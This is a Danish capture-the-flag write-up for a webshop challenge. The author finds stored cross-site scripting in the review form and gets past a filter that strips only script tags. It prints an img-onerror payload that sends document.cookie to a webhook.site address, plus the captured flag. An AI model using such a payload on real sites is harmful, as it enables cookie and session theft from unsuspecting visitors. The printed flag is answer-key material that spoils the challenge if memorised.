# Opgave

Velkommen til Det Nordiske Værksted

Frej har endelig fundet sin hjerteven, i hans helt egen webshop.

Det Nordiske Værksted er stedet, hvor kunder ikke bare køber julepynt, men også går på opdagelse i en verden af nordisk inspiration. Mange besøgende elsker at tage sig tid til at kigge rundt på siden, nyde udvalget og lade sig opsluge af stemningen.

Men er den helt sikker?

http://nordiskevaerksted.jul.fdca.dk:5000/ 

---

# Løsning

Hjemmeisden er en webshop, hvor man kan købe ting og skrive anmeldelser.

Efter man har lavet anmeldelsen vil de blive vist på skærmen, hvilket får mig til at tro at vi skal lave XSS.

Jeg prøver derfor at skrive `<script>alert('XSS')</script>` i både navn og anmeldse feltet for at teste om det virker og her bliver alt teksten fjernet, hvilket kunne tyde på at der er saniteret for scripts i inputtet.

Jeg prøver derfor at lave en anmeldelse med `<img src="x" onerror="alert('XSS')">` og det virker så det er kun <script> tags der bliver fjernet.

Jeg kan også se at jeg har en cookie med en `visitor_id`, som jeg måske skal bruge til at stjæle en andens cookie.

Jeg bruger en webhook.site som er en hjemmeside der kan skabe et URL og se alt hvad der bliver sendt til det URL.

Jeg smider derfor denne kode ind som anmeldelse: `<img src="x" onerror="fetch('https://webhook.site/4a054488-09c9-4b34-bf97-04409e064152?cookie=' + document.cookie)">`

Jeg går så ind på webhook.site og får ikke umiddelbart noget interessant andet end min egen cookie. Det viste sig dog at man bare skal vente lidt og efter lidt tid fik jeg en request med denne cookie: **visitor_id=a578e7f0-fc80-4081-8728-dd3d60feed1b; Flag=FDCA{N0gle_g4ng3_sk41_m4n_v3nt3}**

Flaget er dermed: **Flag=FDCA{N0gle_g4ng3_sk41_m4n_v3nt3}**

---
